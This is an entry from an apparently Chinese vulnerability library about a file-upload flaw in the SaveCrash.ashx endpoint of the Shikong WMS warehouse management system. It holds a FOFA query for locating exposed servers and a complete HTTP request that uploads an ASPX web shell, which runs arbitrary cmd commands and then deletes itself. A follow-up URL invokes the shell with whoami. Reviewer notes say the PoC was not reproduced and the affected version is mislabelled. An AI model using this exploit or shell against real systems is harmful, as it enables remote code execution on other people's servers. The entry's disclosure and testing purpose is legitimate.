---
source: "wy876 漏洞文库"
title: "时空WMS仓储精细化管理系统 SaveCrash.ashx文件上传"
product: "时空WMS仓储精细化管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知，正文/FM错填锁群管理系统V2.0"
prerequisites: "未说明"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zbiltpbxr1s31uex"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%83%91%E5%B7%9E%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E6%97%B6%E7%A9%BAWMS-%E4%BB%93%E5%82%A8%E7%B2%BE%E7%BB%86%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FSaveCrash%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"SKControlkLForJson.ashx\""
fofa_unverified: "body="
id: "vw-0971ac68b03e9c0820a820f5"
entity_id: "ve-0971ac68b03e9c0820a820f5"
schema_version: "1"
---

# 时空WMS仓储精细化管理系统 SaveCrash.ashx文件上传

## 条目说明

- 对象与具体问题：时空WMS仓储精细化管理系统；SaveCrash.ashx文件上传
- 版本、配置及部署条件：未知，正文/FM错填锁群管理系统V2.0
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同555脚本但崩溃日志入口/输出目录独立；固定时间数字路径应来自响应
- 可交互命令脚本自删除不代表无风险，需标上传状态及清理
- 缺返回、鉴权、真正版本及修复

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
时空WMS-仓储精细化 管理系统Q是一款高效、智能的仓储管理工具，旨在帮助企业实现仓库的精细化管理和高效运营。由郑州时空软件开发，专注于以数字化、智能化推动企业进步。该系统基于先进的仓储管理理念和技术架构，融合了物联网、移动互联等前沿技术，实现了对仓库内物资的全面、精准、高效管理。系统适用于各类仓储物流企业，包括电商仓储、第三方物流、生产仓储等多个领域。通过使用该系统，企业可以实现对仓库内物资的全面掌控和高效管理，提高库存周转率，降低库存成本，提升企业竞争优势。时空WMS-仓储精细化管理系统SaveCrash存在文件上传漏洞 

## 二、影响版本
```plain
锁群管理系统 V2.0
```

## 三、资产测绘
+ fofa`body="SKControlkLForJson.ashx"`
+ 特征


## 四、漏洞复现
```http
POST /crash/SaveCrash.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="file"; filename="rce.aspx"
Content-Type: text/plain

<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
------WebKitFormBoundaryssh7UfnPpGU7BXfK--
```


```plain
/crash/log/2024_12/133775453729140443.aspx?cmd=whoami
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zbiltpbxr1s31uex>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
